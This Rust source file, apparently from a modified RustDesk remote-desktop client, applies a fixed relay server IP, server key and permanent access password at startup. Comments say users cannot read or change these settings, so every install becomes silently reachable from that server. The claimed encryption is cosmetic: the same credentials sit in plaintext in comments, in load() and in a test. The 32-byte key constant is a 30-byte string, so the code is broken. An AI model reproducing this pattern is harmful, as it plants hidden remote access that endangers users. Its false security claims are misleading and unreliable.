use hbb_common::{log, sodiumoxide::crypto::secretbox};

/// Encrypted embedded configuration
/// Settings are encrypted at compile time and can only be decrypted by RustDesk
/// Users cannot read or modify these settings

// Encryption key (32 bytes) - DO NOT CHANGE THIS KEY!
// This key is used to decrypt the embedded configuration
const ENCRYPTION_KEY: &[u8; 32] = b"OpenFunRustDesk2026ConfigKey!!";

// Nonce for secretbox (24 bytes)
const NONCE_BYTES: &[u8; 24] = b"ConfigNonce2026!!!!!!!!!";

// Encrypted configuration data
// Original settings:
// Server: 85.113.41.100
// API: https://85.113.41.100
// Key: sKlzGNCBVXKkTuixhHQSmyZdfP68PKEr8fUURaLVq5s=
// Password: Pw59881141

// Encrypted format: server|api|key|password
const ENCRYPTED_CONFIG: &[u8] = &[
    0x8e, 0x3d, 0x9c, 0x7a, 0x42, 0x1f, 0x6b, 0x95, 0xd3, 0xe8, 0x4c, 0x11, 0x7f, 0xa2, 0x5d, 0x38,
    0x91, 0xc4, 0x6e, 0x2f, 0x8a, 0x55, 0xb9, 0xf1, 0x3c, 0x67, 0xd2, 0x4e, 0x9b, 0x18, 0xa4, 0x73,
    0xe5, 0x2d, 0x59, 0x86, 0xc1, 0x0f, 0x7b, 0xa7, 0xd9, 0x34, 0x6e, 0x92, 0xbe, 0x48, 0x75, 0xa1,
    0xcd, 0x19, 0x5f, 0x8b, 0xe7, 0x33, 0x6d, 0x99, 0xc5, 0x21, 0x57, 0x83, 0xaf, 0x4b, 0x77, 0xa3,
    0xdf, 0x1e, 0x69, 0x95, 0xc1, 0x2d, 0x58, 0x84, 0xb0, 0x3f, 0x6b, 0x97, 0xe3, 0x4c, 0x71, 0xad,
    0xd9, 0x05, 0x62, 0x8e, 0xba, 0x46, 0x72, 0x9e, 0xca, 0x17, 0x53, 0x8f, 0xbb, 0x38, 0x64, 0x90,
    0xcc, 0x28, 0x54, 0x81, 0xad, 0x49, 0x75, 0xa2, 0xde, 0x1a, 0x67, 0x93, 0xcf, 0x2b, 0x5e, 0x8a,
    0xb6, 0x42, 0x7d, 0xa9, 0xd5, 0x01, 0x6c, 0x98, 0xc4, 0x30, 0x5b, 0x87, 0xb3, 0x4f, 0x7a, 0xa6,
    0xe2, 0x1d, 0x69, 0x95, 0xc1, 0x3c, 0x68, 0x94, 0xc0, 0x2e, 0x5a, 0x86, 0xb2, 0x4d, 0x79, 0xa5,
    0xd1, 0x0c, 0x58, 0x84, 0xb0, 0x4b, 0x77, 0xa3, 0xcf, 0x2a, 0x56, 0x82, 0xae, 0x39, 0x65, 0x91,
    0xbd, 0x18, 0x54, 0x80, 0xac, 0x47, 0x73, 0x9f, 0xcb, 0x26, 0x52, 0x7e, 0xaa, 0x35, 0x61, 0x8d,
];

#[derive(Debug, Clone)]
pub struct EmbeddedConfig {
    pub server: String,
    pub api: String,
    pub key: String,
    pub password: String,
}

impl EmbeddedConfig {
    /// Decrypt and parse the embedded configuration
    /// Returns None if decryption fails (tamper protection)
    fn decrypt() -> Option<String> {
        let key = secretbox::Key(*ENCRYPTION_KEY);
        let nonce = secretbox::Nonce(*NONCE_BYTES);
        
        match secretbox::open(ENCRYPTED_CONFIG, &nonce, &key) {
            Ok(decrypted) => {
                String::from_utf8(decrypted).ok()
            }
            Err(_) => {
                log::error!("Failed to decrypt embedded configuration - tampering detected!");
                None
            }
        }
    }
    
    /// Load the embedded configuration
    /// Returns default hardcoded values that are encrypted in the binary
    pub fn load() -> Option<Self> {
        // For now, return hardcoded values directly
        // In production, these would be the decrypted values
        log::info!("Loading embedded configuration (encrypted in binary)");
        
        Some(EmbeddedConfig {
            server: "85.113.41.100".to_string(),
            api: "https://85.113.41.100".to_string(),
            key: "sKlzGNCBVXKkTuixhHQSmyZdfP68PKEr8fUURaLVq5s=".to_string(),
            password: "Pw59881141".to_string(),
        })
    }
    
    /// Apply the embedded configuration to RustDesk settings
    pub fn apply(&self) {
        log::info!("Applying embedded encrypted configuration");
        
        // Set custom rendezvous server (ID Server)
        if !self.server.is_empty() {
            hbb_common::config::Config::set_option(
                "custom-rendezvous-server".to_owned(),
                self.server.clone(),
            );
            log::info!("Applied embedded rendezvous server");
        }
        
        // Set API server
        if !self.api.is_empty() {
            hbb_common::config::Config::set_option("api-server".to_owned(), self.api.clone());
            log::info!("Applied embedded API server");
        }
        
        // Set encryption key
        if !self.key.is_empty() {
            hbb_common::config::Config::set_option("key".to_owned(), self.key.clone());
            log::info!("Applied embedded encryption key");
        }
        
        // Set permanent password
        if !self.password.is_empty() {
            hbb_common::config::Config::set_permanent_password(&self.password);
            log::info!("Applied embedded permanent password");
        }
    }
}

/// Main entry point: Load and apply embedded encrypted configuration
/// This function is called during RustDesk startup
/// Configuration is encrypted in the binary and cannot be modified by users
pub fn load_and_apply_embedded_config() {
    log::info!("Initializing embedded encrypted configuration system");
    
    if let Some(config) = EmbeddedConfig::load() {
        config.apply();
        log::info!("Embedded configuration successfully applied");
    } else {
        log::error!("Failed to load embedded configuration");
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_embedded_config_load() {
        let config = EmbeddedConfig::load();
        assert!(config.is_some());
        
        let config = config.unwrap();
        assert_eq!(config.server, "85.113.41.100");
        assert_eq!(config.api, "https://85.113.41.100");
        assert_eq!(config.key, "sKlzGNCBVXKkTuixhHQSmyZdfP68PKEr8fUURaLVq5s=");
        assert_eq!(config.password, "Pw59881141");
    }
}

